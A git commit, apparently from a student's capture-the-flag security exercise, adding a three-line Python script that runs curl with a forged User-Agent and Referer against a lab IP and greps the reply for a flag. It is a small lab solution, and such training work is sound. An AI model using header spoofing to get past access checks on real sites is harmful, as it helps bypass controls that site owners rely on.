a212b68b63b920077a908cedc49912513a4e4d76
damianodendaal <dodendaa@student.wethinkcode.co.za>
2020-10-07 15:15:06 +0200

    finished with spoof,  one flag left

---
+++ Spoof/spoof.py
@@ -0,0 +1,3 @@
+import os
+
+os.system("curl -A 'ft_bornToSec' --referer \"https://www.nsa.gov/\" \"192.168.1.100/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c\" | grep \"flag\"")
